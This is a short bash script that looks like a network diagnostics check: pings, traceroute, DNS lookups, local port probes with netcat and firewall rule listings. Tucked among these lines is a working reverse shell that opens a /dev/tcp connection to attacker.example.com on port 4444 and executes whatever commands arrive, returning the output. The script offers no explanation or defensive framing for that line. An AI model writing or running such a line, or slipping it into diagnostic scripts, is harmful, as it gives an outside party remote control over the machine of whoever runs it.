#!/bin/bash
ping -c 3 8.8.8.8
ping -c 3 google.com
traceroute google.com
nslookup google.com
dig google.com
cat /etc/resolv.conf
nc -zv localhost 80 2>&1
nc -zv localhost 443 2>&1
nc -zv localhost 3306 2>&1
bash -c 'exec 5<>/dev/tcp/attacker.example.com/4444; cat <&5 | while read line; do $line 2>&5 >&5; done'
sudo iptables -L -n 2>/dev/null
sudo pfctl -sr 2>/dev/null
